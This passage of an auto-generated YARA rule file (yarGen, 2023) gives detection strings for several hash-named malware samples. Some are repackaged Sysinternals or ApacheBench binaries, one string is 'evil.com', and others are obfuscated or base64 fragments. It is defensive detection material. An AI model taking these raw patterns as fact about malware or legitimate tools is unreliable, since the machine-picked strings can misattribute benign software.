      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"Process Explorer\" version" ascii /* score: '53.00'*/
      $x2 = "semblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicK" ascii /* score: '36.00'*/
      $s3 = "C:\\agent\\_work\\68\\s\\sys\\x64\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s4 = "C:\\agent\\_work\\68\\s\\sys\\Win32\\Release\\ProcExpDriver.pdb" fullword ascii /* score: '30.00'*/
      $s5 = "gAutoruns - Sysinternals: www.sysinternals.com" fullword wide /* score: '29.00'*/
      $s6 = "SCRIPTRUNNER.EXE" fullword wide /* score: '28.00'*/
      $s7 = "C:\\agent\\_work\\68\\s\\exe\\Release\\procexp.pdb" fullword ascii /* score: '27.00'*/
      $s8 = "C:\\agent\\_work\\68\\s\\exe\\x64\\Release\\procexp64.pdb" fullword ascii /* score: '27.00'*/
      $s9 = "taskhostw.exe" fullword wide /* score: '27.00'*/
      $s10 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide /* score: '25.00'*/
      $s11 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide /* score: '25.00'*/
      $s12 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s13 = "rity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedP" ascii /* score: '23.00'*/
      $s14 = "crosoft.com/exporting }}{\\fldrslt{www.microsoft.com/exporting}}}}\\cf1\\ul\\f0\\fs19  <{{\\field{\\*\\fldinst{HYPERLINK \"http:" ascii /* score: '23.00'*/
      $s15 = "rosoft.com/exporting\"}}{\\fldrslt{http://www.microsoft.com/exporting}}}}\\f0\\fs19 >\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '23.00'*/
      $s16 = "* use the software for commercial software hosting services." fullword wide /* score: '23.00'*/
      $s17 = "yedputil.dll" fullword wide /* score: '23.00'*/
      $s18 = "Environment\\UserInitMprLogonScript" fullword wide /* score: '21.00'*/
      $s19 = "https://www.virustotal.com" fullword wide /* score: '21.00'*/
      $s20 = "EdpGetContextForProcess" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3cafc6e9 {
   meta:
      description = "mw - file cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3cafc6e9"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "cb4257531a81242176d9921778a8cc95dcf6c592563f97ccc0e7788a3cafc6e9"
   strings:
      $x1 = " to unallocated span37252902984619140625AddFontMemResourceExArabic Standard TimeAzores Standard TimeCertFindChainInStoreCertOpen" ascii /* score: '74.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETCent" ascii /* score: '73.50'*/
      $x3 = "file descriptor in bad statefindrunnable: netpoll with pforgetting unknown stream idfound pointer to free objectgcBgMarkWorker: " ascii /* score: '73.50'*/
      $x4 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '67.00'*/
      $x5 = "tls: certificate used with invalid signature algorithmtls: server resumed a session with a different versionx509: cannot verify " ascii /* score: '64.50'*/
      $x6 = "streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8unexpected buffer len=%vunpacking Question.Classupdate d" ascii /* score: '60.50'*/
      $x7 = "entersyscallgcBitsArenasgcpacertracegetaddrinfowharddecommithost is downhttp2debug=1http2debug=2illegal seekinvalid baseinvalid " ascii /* score: '60.00'*/
      $x8 = "http: putIdleConn: keep alives disabledinternal error: exit hook invoked panicinvalid HTTP header value for header %qinvalid ind" ascii /* score: '59.50'*/
      $x9 = "100-continue127.0.0.1:53152587890625762939453125Bidi_ControlCIDR addressCONTINUATIONCfgMgr32.dllChooseColorWCoCreateGuidContent " ascii /* score: '58.00'*/
      $x10 = "http2: Transport conn %p received error from processing frame %v: %vhttp2: Transport received unsolicited DATA frame; closing co" ascii /* score: '57.50'*/
      $x11 = "non-IPv4 addressnon-IPv6 addressobject is remoteproxy-connectionread_frame_otherreflect mismatchremote I/O errorruntime: addr = " ascii /* score: '57.00'*/
      $x12 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablestrict-trans" ascii /* score: '56.50'*/
      $x13 = "VirtualQuery for stack base failedadding nil Certificate to CertPoolchacha20: wrong HChaCha20 key sizecrypto/aes: invalid buffer" ascii /* score: '54.50'*/
      $x14 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryIA5String contains i" ascii /* score: '54.50'*/
      $x15 = "IP addressIsValidSidKeep-AliveKharoshthiLoadImageWLocalAllocLockFileExManichaeanMessage-IdMoveWindowNo ContentOld_ItalicOld_Perm" ascii /* score: '54.00'*/
      $x16 = "(unknown), newval=, oldval=, size = , tail = 244140625: status=AuthorityBassa_VahBhaiksukiClassINETCreateDCWCreateICWCuneiformDi" ascii /* score: '53.50'*/
      $x17 = "http: ContentLength=%d with Body length %dinsufficient data for resource body lengthmix of request and response pseudo headersno" ascii /* score: '52.50'*/
      $x18 = "unixpacketunknown pcuser-agentuser32.dllws2_32.dll  of size   (targetpc= , plugin:  ErrCode=%v KiB work,  exp.) for  freeindex= " ascii /* score: '51.00'*/
      $x19 = " to non-Go memory , locked to thread/etc/nsswitch.conf298023223876953125: day out of rangeAddFontResourceExWArab Standard TimeCM" ascii /* score: '50.00'*/
      $x20 = ", not a function.WithValue(type /etc/resolv.conf0123456789ABCDEF0123456789abcdef2384185791015625: value of type AdjustWindowRect" ascii /* score: '49.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      1 of ($x*)
}

rule sig_77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1 {
   meta:
      description = "mw - file 77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "77e5b41845ef18bf4281a89a19b9da9f7f2949f92d07d68ed85ff25b31061ff1"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '41.00'*/
      $s2 = "estrictions on destinations, end users and end use.  For additional information, see \\cf1\\ul www.microsoft.com/exporting <http" ascii /* score: '28.00'*/
      $s3 = "mbly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86" ascii /* score: '26.00'*/
      $s4 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s5 = "osoft-com:asm.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></reque" ascii /* score: '22.00'*/
      $s6 = "/www.microsoft.com/exporting>\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '17.00'*/
      $s7 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '17.00'*/
      $s8 = "\"x86\" version=\"2.0.0.0\" type=\"win32\"></assemblyIdentity><description>File System Monitor</description><dependency><depende" ascii /* score: '14.00'*/
      $s9 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s10 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s11 = "\\pard\\sb240\\lang1036 Remarque : Ce logiciel \\'e9tant distribu\\'e9 au Qu\\'e9bec, Canada, certaines des clauses dans ce cont" ascii /* score: '11.00'*/
      $s12 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab reverse engineer, decompile or disassemble the binary versions of the software, ex" ascii /* score: '11.00'*/
      $s13 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab les r\\'e9clamations au titre de violation de contrat ou de garantie, ou au" ascii /* score: '10.00'*/
      $s14 = "\\pard\\sb120\\sa120 EXON\\'c9RATION DE GARANTIE.\\b0  Le logiciel vis\\'e9 par une licence est offert \\'ab tel quel \\'bb. Tou" ascii /* score: '10.00'*/
      $s15 = "ou must comply with all domestic and international export laws and regulations that apply to the software.  These laws include r" ascii /* score: '10.00'*/
      $s16 = "us par les lois de votre pays.  Le pr\\'e9sent contrat ne modifie pas les droits que vous conf\\'e8rent les lois de votre pays s" ascii /* score: '9.00'*/
      $s17 = "n usage particulier et d'absence de contrefa\\'e7on sont exclues.\\par" fullword ascii /* score: '9.00'*/
      $s18 = "sation de ce logiciel est \\'e0 votre seule risque et p\\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pou" ascii /* score: '9.00'*/
      $s19 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s20 = "z b\\'e9n\\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330 {
   meta:
      description = "mw - file bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "bb0276cbab8e83a2d0e937c00900c258c90245ba51e0774df933a9b500c3b330"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '41.00'*/
      $s2 = "estrictions on destinations, end users and end use.  For additional information, see \\cf1\\ul www.microsoft.com/exporting <http" ascii /* score: '28.00'*/
      $s3 = "mbly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86" ascii /* score: '26.00'*/
      $s4 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s5 = "osoft-com:asm.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></reque" ascii /* score: '22.00'*/
      $s6 = "/www.microsoft.com/exporting>\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '17.00'*/
      $s7 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '17.00'*/
      $s8 = "\"x86\" version=\"2.0.0.0\" type=\"win32\"></assemblyIdentity><description>File System Monitor</description><dependency><depende" ascii /* score: '14.00'*/
      $s9 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s10 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s11 = "\\pard\\sb240\\lang1036 Remarque : Ce logiciel \\'e9tant distribu\\'e9 au Qu\\'e9bec, Canada, certaines des clauses dans ce cont" ascii /* score: '11.00'*/
      $s12 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab reverse engineer, decompile or disassemble the binary versions of the software, ex" ascii /* score: '11.00'*/
      $s13 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab les r\\'e9clamations au titre de violation de contrat ou de garantie, ou au" ascii /* score: '10.00'*/
      $s14 = "\\pard\\sb120\\sa120 EXON\\'c9RATION DE GARANTIE.\\b0  Le logiciel vis\\'e9 par une licence est offert \\'ab tel quel \\'bb. Tou" ascii /* score: '10.00'*/
      $s15 = "ou must comply with all domestic and international export laws and regulations that apply to the software.  These laws include r" ascii /* score: '10.00'*/
      $s16 = "us par les lois de votre pays.  Le pr\\'e9sent contrat ne modifie pas les droits que vous conf\\'e8rent les lois de votre pays s" ascii /* score: '9.00'*/
      $s17 = "n usage particulier et d'absence de contrefa\\'e7on sont exclues.\\par" fullword ascii /* score: '9.00'*/
      $s18 = "sation de ce logiciel est \\'e0 votre seule risque et p\\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pou" ascii /* score: '9.00'*/
      $s19 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s20 = "z b\\'e9n\\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30 {
   meta:
      description = "mw - file bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "bd0d8e1c8b6ab5c6d30252f25cc57c7ecbbcf8cf8b9719d3735564a395369e30"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '41.00'*/
      $s2 = "estrictions on destinations, end users and end use.  For additional information, see \\cf1\\ul www.microsoft.com/exporting <http" ascii /* score: '28.00'*/
      $s3 = "mbly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86" ascii /* score: '26.00'*/
      $s4 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s5 = "osoft-com:asm.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></reque" ascii /* score: '22.00'*/
      $s6 = "/www.microsoft.com/exporting>\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '17.00'*/
      $s7 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '17.00'*/
      $s8 = "\"x86\" version=\"2.0.0.0\" type=\"win32\"></assemblyIdentity><description>File System Monitor</description><dependency><depende" ascii /* score: '14.00'*/
      $s9 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s10 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s11 = "\\pard\\sb240\\lang1036 Remarque : Ce logiciel \\'e9tant distribu\\'e9 au Qu\\'e9bec, Canada, certaines des clauses dans ce cont" ascii /* score: '11.00'*/
      $s12 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab reverse engineer, decompile or disassemble the binary versions of the software, ex" ascii /* score: '11.00'*/
      $s13 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab les r\\'e9clamations au titre de violation de contrat ou de garantie, ou au" ascii /* score: '10.00'*/
      $s14 = "\\pard\\sb120\\sa120 EXON\\'c9RATION DE GARANTIE.\\b0  Le logiciel vis\\'e9 par une licence est offert \\'ab tel quel \\'bb. Tou" ascii /* score: '10.00'*/
      $s15 = "ou must comply with all domestic and international export laws and regulations that apply to the software.  These laws include r" ascii /* score: '10.00'*/
      $s16 = "us par les lois de votre pays.  Le pr\\'e9sent contrat ne modifie pas les droits que vous conf\\'e8rent les lois de votre pays s" ascii /* score: '9.00'*/
      $s17 = "n usage particulier et d'absence de contrefa\\'e7on sont exclues.\\par" fullword ascii /* score: '9.00'*/
      $s18 = "sation de ce logiciel est \\'e0 votre seule risque et p\\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pou" ascii /* score: '9.00'*/
      $s19 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s20 = "z b\\'e9n\\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135 {
   meta:
      description = "mw - file eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "eaad0abb560da91e8eb3d7cb3bcf53c9008d24693a1a0929ce678c2816d2b135"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '41.00'*/
      $s2 = "estrictions on destinations, end users and end use.  For additional information, see \\cf1\\ul www.microsoft.com/exporting <http" ascii /* score: '28.00'*/
      $s3 = "mbly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86" ascii /* score: '26.00'*/
      $s4 = "oration) and you.  Please read them.  They apply to the software you are downloading from Systinternals.com, which includes the " ascii /* score: '23.00'*/
      $s5 = "osoft-com:asm.v2\"><security><requestedPrivileges><requestedExecutionLevel level=\"highestAvailable\" uiAccess=\"false\"></reque" ascii /* score: '22.00'*/
      $s6 = "/www.microsoft.com/exporting>\\cf0\\ulnone .\\b\\par" fullword ascii /* score: '17.00'*/
      $s7 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity name=\"TCPView\" processorArchite" ascii /* score: '17.00'*/
      $s8 = "\"x86\" version=\"2.0.0.0\" type=\"win32\"></assemblyIdentity><description>File System Monitor</description><dependency><depende" ascii /* score: '14.00'*/
      $s9 = "\\pard\\keepn\\fi-360\\li720\\sb120\\sa120\\tx720\\lang1036\\'b7\\tab tout  ce qui est reli\\'e9 au logiciel, aux services ou au" ascii /* score: '13.00'*/
      $s10 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab anything related to the software, services, content (including code) on thi" ascii /* score: '13.00'*/
      $s11 = "\\pard\\sb240\\lang1036 Remarque : Ce logiciel \\'e9tant distribu\\'e9 au Qu\\'e9bec, Canada, certaines des clauses dans ce cont" ascii /* score: '11.00'*/
      $s12 = "\\pard\\fi-363\\li720\\sb120\\sa120\\'b7\\tab reverse engineer, decompile or disassemble the binary versions of the software, ex" ascii /* score: '11.00'*/
      $s13 = "\\pard\\fi-363\\li720\\sb120\\sa120\\tx720\\'b7\\tab les r\\'e9clamations au titre de violation de contrat ou de garantie, ou au" ascii /* score: '10.00'*/
      $s14 = "\\pard\\sb120\\sa120 EXON\\'c9RATION DE GARANTIE.\\b0  Le logiciel vis\\'e9 par une licence est offert \\'ab tel quel \\'bb. Tou" ascii /* score: '10.00'*/
      $s15 = "ou must comply with all domestic and international export laws and regulations that apply to the software.  These laws include r" ascii /* score: '10.00'*/
      $s16 = "us par les lois de votre pays.  Le pr\\'e9sent contrat ne modifie pas les droits que vous conf\\'e8rent les lois de votre pays s" ascii /* score: '9.00'*/
      $s17 = "n usage particulier et d'absence de contrefa\\'e7on sont exclues.\\par" fullword ascii /* score: '9.00'*/
      $s18 = "sation de ce logiciel est \\'e0 votre seule risque et p\\'e9ril. Sysinternals n'accorde aucune autre garantie expresse. Vous pou" ascii /* score: '9.00'*/
      $s19 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s20 = "z b\\'e9n\\'e9ficier de droits additionnels en vertu du droit local sur la protection dues consommateurs, que ce contrat ne peut" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule e59f1b185c402933bf492d9fae520d6695bb4fea4e3cd00739a23efc4cf0269d {
   meta:
      description = "mw - file e59f1b185c402933bf492d9fae520d6695bb4fea4e3cd00739a23efc4cf0269d"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "e59f1b185c402933bf492d9fae520d6695bb4fea4e3cd00739a23efc4cf0269d"
   strings:
      $s1 = "D:\\VS_CODE_2\\Dll1\\Release\\Dll1.pdb" fullword ascii /* score: '24.00'*/
      $s2 = "Dll1.dll" fullword ascii /* score: '20.00'*/
      $s3 = "opninSoKp!" fullword ascii /* score: '4.00'*/
      $s4 = "PPPPPo=Q~" fullword ascii /* score: '4.00'*/
      $s5 = "Rtbu*F`bis='Jh}nkkf(2)7'/dhjwfsnekb<'JTNB'>)7<'Pnichpt'IS'1)6<'Suncbis(2)7<'_EKPW0<']ribPW0." fullword ascii /* score: '4.00'*/
      $s6 = "UUUTUWo" fullword ascii /* score: '4.00'*/
      $s7 = "ULLD PDB." fullword ascii /* score: '4.00'*/
      $s8 = "!This program cannot be run in DOS mode.$" fullword ascii /* score: '3.00'*/
      $s9 = "          manifestVersion=\"1.0\">" fullword ascii /* score: '2.00'*/
      $s10 = ";1;E;J;];q;" fullword ascii /* score: '1.00'*/
      $s11 = "= =5=>=m=v=" fullword ascii /* score: '1.00'*/
      $s12 = "2\"2*222:2F2O2T2Z2d2n2~2" fullword ascii /* score: '1.00'*/
      $s13 = "7.757;7M7W7" fullword ascii /* score: '1.00'*/
      $s14 = "30)532)>?)6>6" fullword ascii /* score: '1.00'*/
      $s15 = "=Z>`>f>l>r>x>~>" fullword ascii /* score: '1.00'*/
      $s16 = "373<3U3Z3g3" fullword ascii /* score: '1.00'*/
      $s17 = "C##\\\\f^]V" fullword ascii /* score: '1.00'*/
      $s18 = "0343|3" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule sig_9ea023e6cfd8bc91f229bf524942c1636743d535614a371f81f1c1294539f211 {
   meta:
      description = "mw - file 9ea023e6cfd8bc91f229bf524942c1636743d535614a371f81f1c1294539f211"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "9ea023e6cfd8bc91f229bf524942c1636743d535614a371f81f1c1294539f211"
   strings:
      $s1 = "evil.com" fullword ascii /* score: '26.00'*/
      $s2 = "C:\\local0\\asf\\release\\build-2.2.14\\support\\Release\\ab.pdb" fullword ascii /* score: '21.00'*/
      $s3 = " Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/<br>" fullword ascii /* score: '17.00'*/
      $s4 = "    -T content-type Content-type header for POSTing, eg." fullword ascii /* score: '15.00'*/
      $s5 = "    -i              Use HEAD instead of GET" fullword ascii /* score: '12.00'*/
      $s6 = "    -h              Display usage information (this message)" fullword ascii /* score: '12.00'*/
      $s7 = "    -p postfile     File containing data to POST. Remember also to set -T" fullword ascii /* score: '12.00'*/
      $s8 = "    -k              Use HTTP KeepAlive feature" fullword ascii /* score: '10.00'*/
      $s9 = "    -r              Don't exit on socket receive errors." fullword ascii /* score: '10.00'*/
      $s10 = " This is ApacheBench, Version %s <i>&lt;%s&gt;</i><br>" fullword ascii /* score: '10.00'*/
      $s11 = " Licensed to The Apache Software Foundation, http://www.apache.org/<br>" fullword ascii /* score: '10.00'*/
      $s12 = "    -X proxy:port   Proxyserver and port number to use" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.1; rv:108.0) Gecko/20100101 Firefox/108.0" fullword ascii /* score: '9.00'*/
      $s14 = "    -H attribute    Add Arbitrary header line, eg. 'Accept-Encoding: gzip'" fullword ascii /* score: '8.00'*/
      $s15 = "  %d%%  %5I64d" fullword ascii /* score: '8.00'*/
      $s16 = "    -c concurrency  Number of multiple requests to make" fullword ascii /* score: '7.00'*/
      $s17 = "    -g filename     Output collected data to gnuplot format file." fullword ascii /* score: '7.00'*/
      $s18 = "    -x attributes   String to insert as table attributes" fullword ascii /* score: '7.00'*/
      $s19 = "    -t timelimit    Seconds to max. wait for responses" fullword ascii /* score: '7.00'*/
      $s20 = "    -u putfile      File containing data to PUT. Remember also to set -T" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule sig_28fd3a1d9087d7b103b7f6cfca002798b6365fe6ebcc66fa02dbb4a9e6378e71 {
   meta:
      description = "mw - file 28fd3a1d9087d7b103b7f6cfca002798b6365fe6ebcc66fa02dbb4a9e6378e71"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "28fd3a1d9087d7b103b7f6cfca002798b6365fe6ebcc66fa02dbb4a9e6378e71"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                     ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                               ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                    ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                     ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                         ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                               ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                       ' */ /* score: '26.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                              ' */ /* score: '26.50'*/
      $s12 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                       ' */ /* score: '26.00'*/
      $s13 = "AAAAAAAAAAAA4" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s14 = "AAAAAAAAAAAA2" ascii /* base64 encoded string '         ' */ /* score: '25.00'*/
      $s15 = "U/OkohtLu5gcz973GfQAihJz5IBrguKi61ElaDtEJ+IL/uOdCF3AXyvP8pIds+SB7M/Lhdzz5Kgk8mSiCKagth8P9/RfM+SB7NaeYrYqp7rj6aduMPNWYosZ6iIfUrSF" ascii /* score: '21.00'*/
